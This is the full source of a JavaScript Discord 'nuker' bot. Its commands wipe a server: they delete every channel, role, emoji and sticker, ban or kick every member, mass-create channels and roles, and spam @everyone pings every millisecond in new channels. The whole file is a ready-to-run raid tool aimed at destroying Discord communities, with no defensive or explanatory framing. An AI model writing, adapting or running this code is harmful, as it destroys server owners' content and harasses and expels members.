
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(yellow(`
    
                                                   
      ████████    ███     █████████     ███    
    ██                  ██         ██
    ██            ███   ██              ███
      ██████      ███   ██              ███
            ██    ███   ██       ████   ███
            ██    ███   ██         ██   ███
    ████████      ███     █████████     ███

                Nuker: ${nuker.user.tag}
               Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "giving the emperors mercy", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**sigismund ;**
    **delete and spam channels*
    ${prefix}nuke [amoint] [channelname] [text]
    **delete roles ;**
    ${prefix}roles [amount] (text) i.e \`${prefix}mr 5 test\`\n
    **delete channels ;**
    ${prefix}droles
    **delete emotes ;**
    ${prefix}demote
    **delete stickers (new) ;**
    ${prefix}dstickers
    **mass kick ;**
    ${prefix}kick
    **mass ban ;**
    ${prefix}ban
    `)
        .setFooter(`© emperor's champion`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

  
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; 
    var args2 = args.slice(1).join(' ') 
    var args3 = args.slice(2).join(', '); 

    if (!disableEveryone) {

        if (message.content.startsWith(prefix + "com")) {
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "spam")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "roles")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "droles")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dstickers")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }
        if (message.content.startsWith(prefix + "demote")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "b")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "nuke")) {
            DelAndMassPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "kick")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        
        if (message.content.startsWith(prefix + "com")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            
        }

        if (message.content.startsWith(prefix + "spam")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "nuke")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAndMassPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }
        
        if (message.content.startsWith(prefix + "roles")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "droles")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dstickers")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "demote")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "b")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "kick")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
            resolve();
        });
    }

    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
        })
    }

    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.filter(member => member.id !== message.author.id).map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                    }
                }, 2000);
            })
        })
    }
    

    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                    }
                }, 2000);
            })
        })
    }

    function DelAndMassPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
    
           
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))

            message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then(() => {
                for (let i = 0; i < amount; i++) {
                    if (message.guild.channels.cache.size === 500) break;
                    if (!channelName) {
                        message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                            setInterval(() => {
                                ch.send("@everyone " + pingMessage);
                            }, 1);
                        });
                    } else {
                        message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                            setInterval(() => {
                                ch.send("@everyone " + pingMessage);
                            }, 1); 
                        });
                    }
                }
            });
    
            resolve();
        });
    }
});



try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
